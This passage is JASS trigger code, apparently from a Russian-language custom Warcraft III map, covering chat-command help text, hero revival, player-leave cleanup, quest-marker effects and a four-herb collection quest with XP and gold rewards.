call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ff7f00Задания|r. Один из основных источников опыта. Всё просто: делаете задания – получаете награду. \nНо будьте внимательны. При взятии каждого задания пишется его уровень! Так вот, если уровень \nперсонажа не подходит под данный квест – опыт вы за него не получите.")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ff7f00Арена|r.  Сражаясь на Арене, вы будете получать по 2 уровня за каждое её прохождение. Но лишь \nодин раз! Подробнее узнайте у Капитана Арены, которого можно найти на главной базе.")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"-|c00ff7f00Мусор|r. Дополнительный источник опыта. С крипов в локациях иногда падает мусор. Собирайте его \n– приносите Скупщику (найти его можно на главной базе) и получайте награду.")
elseif GetEventPlayerChatString()=="-штащ3" or GetEventPlayerChatString()=="-info3" then
call ClearTextMessagesBJ(GetForceOfPlayer(GetTriggerPlayer()))
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c0000ff00Арена|r. Найдите на стартовой базе Капитана Арены, который даст вам указания по вызову босса \nАрены(обратите внимание на миникарту. Местоположение Капитана сейчас подсветится желтым цветом).")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"Боссы меняются каждые 5 уровней. При вызове противника арены будет вызван тот, под который уровень \nвы подходите. За каждое первое прохождение боссов герою дают награду: 2 уровня, золото, метки, Амулет Арены.")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c00ff6969Но, важно!|r Нужно проходить всех боссов строго по порядку и иметь в инвентаре Героя Амулет Арены, \nкоторый дадут после первого прохождения.")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c00ff0000Внимание!|r Убейте первого босса арены до 5 уровня, дабы не пропустить награду. Также с боссов Арены выпадают особые артефакты.")
call PingMinimapLocForForceEx(GetForceOfPlayer(GetTriggerPlayer()),Location(-15808,-118),40,bj_MINIMAPPINGSTYLE_FLASHY,100,100,0.)
elseif GetEventPlayerChatString()=="-штащ4" or GetEventPlayerChatString()=="-info4" then
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c0000ff00Магазин|r.\nПри нажатии на клавишу |c00ffff00F2|r вашему вниманию будет представлен Магазин. Обратите внимание на \nразделы в магазине – там указан тип предметов и рекомендуемый уровень для их приобретения. ")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c00ff7f00Зелья|r: думаю обьяснять ничего не надо.")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c00ff7f00Снаряжение|r: базовые предметы, которые помогут Героям на начальном этапе игры. Также там можно \nзнакомиться с первым доступным Вам крафтом. Весь крафт в данном разделе добывается и делается в \nграницах локации Лес Долорес.")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"|c00ff7f00Разное|r: расходники, которые понадобятся при добыче рецептов, выполнении квестов и т.д.\n|c00ff7f00Магазин арены|r: сборочные рецепты с артефактов, которые выпадают с боссов Арены (см. пособие по Арене)")
call DisplayTimedTextToPlayer(GetTriggerPlayer(),.5,0,100,"\n|c0000ffffИмейте ввиду|r: делать покупки в магазин можно из любой точки карты - они упадут в |c00ff00ffХранилище|r(обратите \nвнимание на миникарту, Хранилище сейчас подсветится фиолетовым указателем), после чего предметы \nможно отдать Герою кнопкой |c00ffff00Выбросить предметы|r(внутри Хранилища)")
call PingMinimapLocForForceEx(GetForceOfPlayer(GetTriggerPlayer()),Location(-15621,1323),40,bj_MINIMAPPINGSTYLE_FLASHY,100,0,100)
elseif GetEventPlayerChatString()=="-scyt1" or GetEventPlayerChatString()=="-ысне1" then
if nO(MT[Ma],$49305631) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Разрушение': понижает защиту врага на 95 ед. в течении 8 секунд. также каждую секунду он будет получать урон, который повышается каждый тик на базовое его значение. Базовый урон: 50% от Ловкости\n        |c00ff6969Перезарядка|r: 35 секунд.")
endif
elseif GetEventPlayerChatString()=="-scyt2" or GetEventPlayerChatString()=="-ысне2" then
if nO(MT[Ma],$49305633) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Дальновидность':Наносит врагу урон и восстанвливает себе половину НР от этого урона. Урон: 2% от суммы Ловкости и Разума за каждую еденицу расстояния между Героев и целью. Максимальная дальность: 700 ед.\n        |c00ff6969Перезарядка|r: 35 секунд.")
endif
elseif GetEventPlayerChatString()=="-staff" or GetEventPlayerChatString()=="-ыефаа" then
if nO(MT[Ma],$49305635) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Накопление': в указанной точке поочередно создается 5 взрывов, которые наносят урон. Каждый следующий взрыв наносит дополнительный урон в размере 100% от базового. Базовый урон: 100% от Разума.\n        |c00ff6969Перезарядка|r: 35 секунд.")
endif
elseif GetEventPlayerChatString()=="-preo" or GetEventPlayerChatString()=="-зкущ" then
if nO(MT[Ma],$49305532) or nO(MT[Ma],$49305039) then
call DisplayTextToPlayer(GetTriggerPlayer(),0,0,"|c00ffff00Способность|r 'Преобразование': 15% вашего НР пробразуются в МР всех союзников рядом. А враги получают |c003b94a5Чистый|r урон(30% НР)\n        |c00ff6969Перезарядка|r: 25 секунд.")
endif
elseif GetEventPlayerChatString()=="-reforged" then
call BBg(GetTriggerPlayer())
endif
endfunction
function BBl takes nothing returns nothing
set YG=CreateTrigger()
call TriggerRegisterPlayerChatEvent(YG,Player(0),"-",false)
call TriggerRegisterPlayerChatEvent(YG,Player(1),"-",false)
call TriggerRegisterPlayerChatEvent(YG,Player(2),"-",false)
call TriggerRegisterPlayerChatEvent(YG,Player(3),"-",false)
call TriggerRegisterPlayerChatEvent(YG,Player(4),"-",false)
call TriggerRegisterPlayerChatEvent(YG,Player(5),"-",false)
call TriggerRegisterPlayerChatEvent(YG,Player(6),"-",false)
call TriggerRegisterPlayerChatEvent(YG,Player(7),"-",false)
call TriggerAddAction(YG,function BBk)
endfunction
function BBm takes nothing returns nothing
local unit NR=LoadUnitHandle(YN,GetHandleId(GetExpiredTimer()),1)
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local location Mc
if not UnitAlive(NR) then
set Mc=Location(GetRectCenterX(GR),GetRectCenterY(GR))
call ReviveHero(MT[Ma],GetLocationX(Mc),GetLocationY(Mc),false)
call RemoveUnit(Xp[Ma])
set Xp[Ma]=null
call RemoveLocation(Mc)
set Mc=null
endif
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set NR=null
endfunction
function BBn takes nothing returns nothing
local unit Ud=GetTriggerUnit()
local integer Ma=GetPlayerId(GetOwningPlayer(Ud))
local timer Hc
local location Ht=GetUnitLoc(Ud)
local location Mc
if IsUnitType(Ud,UNIT_TYPE_HERO) then
if GetUnitTypeId(Ud)!=$48303635 then
if GetUnitAbilityLevel(Ud,$41304C59)>=1 then
set Mc=GetUnitLoc(Ud)
call ReviveHero(MT[Ma],GetLocationX(Mc),GetLocationY(Mc),false)
call UnitRemoveAbility(Ud,$41304C59)
call RemoveLocation(Mc)
set Mc=null
else
set Xp[Ma]=CreateUnit(Player(Ma),$68303143,GetLocationX(Ht),GetLocationY(Ht),270.)
call SetUnitTimeScale(Xp[Ma],.48)
call UnitApplyTimedLife(Xp[Ma],$42544C46,20.)
set Hc=CreateTimer()
call SaveUnitHandle(YN,GetHandleId(Hc),1,Ud)
call TimerStart(Hc,20.,false,function BBm)
endif
if RectContainsUnit(Gz,Ud)==true then
set So=So+1
call nh(K8,"|c007d7d7dЯ поглощаю души! |r|c00ff0000"+I2S(So),.028,255,255,255)
call nj(K8,500)
endif
endif
endif
set Ud=null
set Hc=null
call RemoveLocation(Ht)
set Ht=null
endfunction
function BBo takes nothing returns nothing
local trigger YM=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(YM,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(YM,function BBn)
set YM=null
endfunction
function BBp takes nothing returns nothing
local unit Hu
local integer L9
local item MO
local integer NG
local integer Pd
local group YP
local boolean YQ=false
local unit Mc
set Hu=MT[GetPlayerId(GetTriggerPlayer())]
if MT[GetPlayerId(GetTriggerPlayer())]!=null then
set MK=MK-1
endif
set MT[GetPlayerId(GetTriggerPlayer())]=null
set Pd=1
loop
set L9=0
loop
set MO=UnitItemInSlot(Hu,L9)
set NG=GetItemTypeId(MO)
if GetItemType(MO)==ITEM_TYPE_UNKNOWN then
call RemoveItem(nP(Hu,NG))
call CreateItem(NG,-15600,2403)
endif
set MO=UnitItemInSlot(NL[GetConvertedPlayerId(GetTriggerPlayer())*2],L9)
set NG=GetItemTypeId(MO)
if GetItemType(MO)==ITEM_TYPE_UNKNOWN then
call RemoveItem(nP(NL[GetConvertedPlayerId(GetTriggerPlayer())*2],NG))
call CreateItem(NG,-15600,2403)
endif
set L9=L9+1
exitwhen L9>=5
endloop
call IssueImmediateOrder(NL[GetConvertedPlayerId(GetTriggerPlayer())*2],"coupletarget")
call TriggerSleepAction(1)
set Pd=Pd+1
exitwhen Pd>=4
endloop
call SetPlayerName(GetTriggerPlayer(),GetPlayerName(GetTriggerPlayer())+"|c007d7d7dLeave")
set OE[GetPlayerId(GetTriggerPlayer())]="Leave"
set OD[GetPlayerId(GetTriggerPlayer())]="|c007d7d7d"
call RemoveUnit(NL[GetConvertedPlayerId(GetTriggerPlayer())*2])
call RemoveUnit(MT[GetPlayerId(GetTriggerPlayer())])
call RemoveUnit(Nc[GetPlayerId(GetTriggerPlayer())+1])
set YP=GetUnitsOfPlayerAll(GetTriggerPlayer())
loop
exitwhen not not YQ
set Mc=FirstOfGroup(YP)
if Mc==null then
set YQ=true
else
call GroupRemoveUnit(YP,Mc)
call RemoveUnit(Mc)
endif
endloop
call SetUnitAbilityLevelSwapped($41304243,IM,MK)
call SetUnitAbilityLevelSwapped($41304244,IM,MK)
call SetUnitAbilityLevelSwapped($53303050,IM,MK)
call MultiboardSetItemValueBJ(Pb,1,13,"|c006969ffСложность: |r"+I2S(MK)+". |c0000ffffОт сложности зависит сила врагов а также шанс выпадения многих редких предметов.")
set Mc=null
set YP=null
set MO=null
set Hu=null
endfunction
function BBq takes nothing returns nothing
set YO=CreateTrigger()
call TriggerRegisterPlayerEventLeave(YO,Player(0))
call TriggerRegisterPlayerEventLeave(YO,Player(1))
call TriggerRegisterPlayerEventLeave(YO,Player(2))
call TriggerRegisterPlayerEventLeave(YO,Player(3))
call TriggerRegisterPlayerEventLeave(YO,Player(4))
call TriggerRegisterPlayerEventLeave(YO,Player(5))
call TriggerRegisterPlayerEventLeave(YO,Player(6))
call TriggerRegisterPlayerEventLeave(YO,Player(7))
call TriggerAddAction(YO,function BBp)
endfunction
function BBr takes nothing returns boolean
if not (IsUnitInGroup(GetTriggerUnit(),To)==false) then
return false
endif
return true
endfunction
function BBs takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$48303147 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303656 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303046 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303653 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303058 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303651 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303031 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303650 then
return true
endif
return false
endfunction
function BBt takes nothing returns boolean
if not BBs() then
return false
endif
return true
endfunction
function BBu takes nothing returns nothing
if BBt() then
if BBr() then
call GroupAddUnit(To,GetTriggerUnit())
else
endif
else
endif
endfunction
function BBv takes nothing returns nothing
set YR=CreateTrigger()
call TriggerRegisterEnterRectSimple(YR,GR)
call TriggerAddAction(YR,function BBu)
endfunction
function BBw takes nothing returns nothing
call AddSpecialEffectTargetUnitBJ("origin",I7,"war3mapImported\\TalkToMev2.mdx")
set Us[59]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KH,"war3mapImported\\TalkToMev2.mdx")
set Us[58]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ja,"war3mapImported\\TalkToMev2.mdx")
set Us[57]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",J5,"war3mapImported\\TalkToMev2.mdx")
set Us[56]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Io,"war3mapImported\\TalkToMev2.mdx")
set Us[55]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kl,"war3mapImported\\TalkToMev2.mdx")
set Us[54]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ji,"war3mapImported\\TalkToMev2.mdx")
set Us[53]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ks,"war3mapImported\\TalkToMev2.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",It,"war3mapImported\\TalkToMev2.mdx")
set Us[51]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Is,"war3mapImported\\TalkToMev2.mdx")
set Us[50]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",J6,"war3mapImported\\TalkToMev2.mdx")
set Us[49]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",J4,"war3mapImported\\TalkToMev2.mdx")
set Us[48]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ju,"war3mapImported\\TalkToMev2.mdx")
set Us[47]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Jt,"war3mapImported\\TalkToMev2.mdx")
set Us[46]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",JW,"war3mapImported\\TalkToMev2.mdx")
set Us[45]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",I5,"war3mapImported\\TalkToMev2.mdx")
set Us[44]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ix,"war3mapImported\\TalkToMev2.mdx")
set Us[43]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Jo,"war3mapImported\\TalkToMev2.mdx")
set Us[42]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Iy,"war3mapImported\\TalkToMev2.mdx")
set Us[41]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KX,"war3mapImported\\TalkToMev2.mdx")
set Us[40]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kb,"war3mapImported\\TalkToMev2.mdx")
set Us[39]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kc,"war3mapImported\\TalkToMev2.mdx")
set Us[37]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Im,"war3mapImported\\TalkToMev2.mdx")
set Us[36]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Je,"war3mapImported\\TalkToMev2.mdx")
set Us[35]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("overhead",If,"war3mapImported\\TalkToMev2.mdx")
set Us[34]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",I6,"war3mapImported\\TalkToMev2.mdx")
set Us[33]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ii,"war3mapImported\\TalkToMev2.mdx")
set Us[32]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kn,"war3mapImported\\TalkToMev2.mdx")
set Us[31]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kj,"war3mapImported\\TalkToMev2.mdx")
set Us[30]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KZ,"war3mapImported\\TalkToMev2.mdx")
set Us[29]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ka,"war3mapImported\\TalkToMev2.mdx")
set Us[28]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",I1,"war3mapImported\\TalkToMev2.mdx")
set Us[27]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KY,"war3mapImported\\TalkToMev2.mdx")
set Us[26]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kk,"war3mapImported\\TalkToMev2.mdx")
set Us[25]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",I3,"war3mapImported\\TalkToMev2.mdx")
set Us[24]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",IX,"war3mapImported\\TalkToMev2.mdx")
set Us[23]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kd,"war3mapImported\\TalkToMev2.mdx")
set Us[22]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",IW,"war3mapImported\\TalkToMev2.mdx")
set Us[21]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Iz,"war3mapImported\\TalkToMev2.mdx")
set Us[20]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ke,"war3mapImported\\TalkToMev2.mdx")
set Us[19]=GetLastCreatedEffectBJ()
call SetUnitInvulnerable(Iw,true)
call AddSpecialEffectTargetUnitBJ("origin",Iw,"war3mapImported\\TalkToMev2.mdx")
set Us[18]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Kg,"war3mapImported\\TalkToMev2.mdx")
set Us[17]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ik,"war3mapImported\\TalkToMev2.mdx")
set Us[15]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Il,"war3mapImported\\TalkToMev2.mdx")
set Us[14]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ij,"war3mapImported\\TalkToMev2.mdx")
set Us[13]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ic,"war3mapImported\\TalkToMev2.mdx")
set Us[12]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KW,"war3mapImported\\TalkToMev2.mdx")
set Us[10]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ig,"war3mapImported\\TalkToMev2.mdx")
set Us[9]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",In,"war3mapImported\\TalkToMev2.mdx")
set Us[16]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",Ia,"war3mapImported\\TalkToMev2.mdx")
set Us[8]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("overhead",Id,"war3mapImported\\TalkToMev2.mdx")
set Us[7]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KV,"war3mapImported\\TalkToMev2.mdx")
set Us[6]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KI,"war3mapImported\\TalkToMev2.mdx")
set Us[5]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KU,"war3mapImported\\TalkToMev2.mdx")
set Us[4]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KR,"war3mapImported\\TalkToMev2.mdx")
set Us[3]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KQ,"war3mapImported\\TalkToMev2.mdx")
set Us[2]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KJ,"war3mapImported\\TalkToMev2.mdx")
set Us[1]=GetLastCreatedEffectBJ()
call AddSpecialEffectTargetUnitBJ("origin",KK,"war3mapImported\\TalkToMev2.mdx")
set Us[0]=GetLastCreatedEffectBJ()
endfunction
function BBx takes nothing returns nothing
set YS=CreateTrigger()
call TriggerRegisterTimerEventSingle(YS,1.)
call TriggerAddAction(YS,function BBw)
endfunction
function BBy takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())>=99.) then
return false
endif
return true
endfunction
function BBz takes nothing returns boolean
if not (GetRandomInt(1,3)==1) then
return false
endif
return true
endfunction
function BB0 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if BBz() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00ООО, Господа! Вам страшно повезло=)
")
call CreateItemLoc($49304A4E,GetUnitLoc(GetTriggerUnit()))
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Не сегодня....=((
")
endif
endfunction
function BB1 takes nothing returns nothing
set YT=CreateTrigger()
call TriggerRegisterUnitEvent(YT,KM,EVENT_UNIT_SELECTED)
call TriggerAddCondition(YT,Condition(function BBy))
call TriggerAddAction(YT,function BB0)
endfunction
function BB2 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E676972) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BB3 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=2) then
return false
endif
return true
endfunction
function BB4 takes nothing returns nothing
if BB3() then
call DestroyEffectBJ(Us[0])
call AddSpecialEffectTargetUnitBJ("overhead",KK,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[0]=GetLastCreatedEffectBJ()
set YV[15]=GetRectCenter(L)
call EnableTrigger(YW)
call CreateItemLoc($49303042,YV[15])
call RemoveLocation(YV[15])
set YV[15]=GetRectCenter(K)
call CreateItemLoc($49303039,YV[15])
call RemoveLocation(YV[15])
set YV[15]=GetRectCenter(H)
call CreateItemLoc($49303043,YV[15])
call RemoveLocation(YV[15])
set YV[15]=GetRectCenter(Ft)
call CreateItemLoc($49303041,YV[15])
call RemoveLocation(YV[15])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Раз плюнуть!\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 2-5|r")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Раз плюнуть!","О, новые Герои! не поможете ли Вы старому Киборгу? Соберите, пожалуйста, в Лесу |c0000FF004 пучка травы|r, из неё варится отменная настойка! Отблагодарю по справедливости!
","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[0]=GetLastCreatedQuestBJ()
call DisableTrigger(GetTriggeringTrigger())
else
call ne(GetTriggerUnit(),"Задание с |c00ff00002|r уровня",.027,255,255,255)
endif
endfunction
function BB5 takes nothing returns nothing
set YU=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(YU,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(YU,Condition(function BB2))
call TriggerAddAction(YU,function BB4)
endfunction
function BB6 takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$49303042 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303039 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303043 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303041 then
return true
endif
return false
endfunction
function BB7 takes nothing returns boolean
if not BB6() then
return false
endif
return true
endfunction
function BB8 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(1.)
call EnableTrigger(YY)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Травы собрано:|r 1/4")
endfunction
function BB9 takes nothing returns nothing
set YW=CreateTrigger()
call DisableTrigger(YW)
call TriggerRegisterAnyUnitEventBJ(YW,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(YW,Condition(function BB7))
call TriggerAddAction(YW,function BB8)
endfunction
function BCB takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$49303042 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303039 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303043 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303041 then
return true
endif
return false
endfunction
function BCC takes nothing returns boolean
if not BCB() then
return false
endif
return true
endfunction
function BCD takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(1.)
call EnableTrigger(YZ)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Травы собрано:|r 2/4")
endfunction
function BCE takes nothing returns nothing
set YY=CreateTrigger()
call DisableTrigger(YY)
call TriggerRegisterAnyUnitEventBJ(YY,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(YY,Condition(function BCC))
call TriggerAddAction(YY,function BCD)
endfunction
function BCF takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$49303042 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303039 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303043 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303041 then
return true
endif
return false
endfunction
function BCG takes nothing returns boolean
if not BCF() then
return false
endif
return true
endfunction
function BCH takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(1.)
call EnableTrigger(Ya)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Травы собрано:|r 3/4")
endfunction
function BCI takes nothing returns nothing
set YZ=CreateTrigger()
call DisableTrigger(YZ)
call TriggerRegisterAnyUnitEventBJ(YZ,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(YZ,Condition(function BCG))
call TriggerAddAction(YZ,function BCH)
endfunction
function BCJ takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$49303042 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303039 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303043 then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$49303041 then
return true
endif
return false
endfunction
function BCK takes nothing returns boolean
if not BCJ() then
return false
endif
return true
endfunction
function BCL takes nothing returns nothing
call EnableTrigger(Yb)
call DestroyEffectBJ(Us[0])
call AddSpecialEffectTargetUnitBJ("overhead",KK,"war3mapImported\\QuestYellow1.mdx")
set Us[0]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|c00FF7F00Травы собрано:|r 4/4
Вернитесь к Киборгу!")
call DisableTrigger(GetTriggeringTrigger())
endfunction
function BCM takes nothing returns nothing
set Ya=CreateTrigger()
call DisableTrigger(Ya)
call TriggerRegisterAnyUnitEventBJ(Ya,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Ya,Condition(function BCK))
call TriggerAddAction(Ya,function BCL)
endfunction
function BCN takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E676972) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BCO takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BCP takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BCQ takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BCR takes nothing returns boolean
return GetBooleanAnd(BCP(),BCQ())
endfunction
function BCS takes nothing returns boolean
return GetBooleanAnd(BCO(),BCR())
endfunction
function BCT takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=2) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=5) then
return false
endif
return true
endfunction
function BCU takes nothing returns nothing
if BCT() then
call AddHeroXP(GetEnumUnit(),500,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+500
else
endif
endfunction
function BCV takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=2) then
return false
endif
return true
endfunction
function BCW takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=2) then
return false
endif
return true
endfunction
function BCX takes nothing returns nothing
if BCW() then
call DestroyEffectBJ(Us[0])
call QuestSetCompletedBJ(YX[0],true)
call DestroyQuest(YX[0])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BCS))
call ForGroupBJ(Th,function BCU)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF500 опыта|r, |c00ffff0050 золота|r, |c00ff96962 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BCV() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+150
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+6
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
call DisableTrigger(GetTriggeringTrigger())
else
call ne(GetTriggerUnit(),"Задание с |c00ff00002|r уровня",.027,255,255,255)
endif
endfunction
